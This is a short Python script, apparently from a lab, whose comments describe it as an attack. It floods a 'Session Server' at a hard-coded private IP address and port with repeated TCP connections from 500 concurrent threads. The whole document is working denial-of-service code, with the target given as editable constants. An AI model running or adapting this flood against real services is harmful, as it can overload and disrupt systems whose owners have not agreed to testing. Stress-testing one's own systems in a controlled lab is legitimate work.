import socket
import threading
import time
import random

target_ip = "192.168.100.88"  # Target IP address.
target_port = 5003  # Session Server port number.

# Defines the attack function.
def flood():  
    while True:  # Loop for continuous attack.
        try:  # Attempt to execute the code.
            # Create TCP socket.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to target.
            s.connect((target_ip, target_port))
            
            # Send message to target.
            s.sendall(b"Connecting . . .")
            
            # Close the connection.
            s.close()
            
            # Wait a random time before the next attempt.
            time.sleep(random.uniform(1, 1.5))  
            
        except Exception as e:
            # Handle connection errors by printing the error.
            print(f"Connection failed: {e}")
            
            # Exit the loop on error.
            break


# Set number of threads.
num_threads = 500

# Loop to create threads.
for i in range(num_threads):  
    thread = threading.Thread(target=flood)  # Create a thread to run flood().
    thread.start()  # Start the thread.
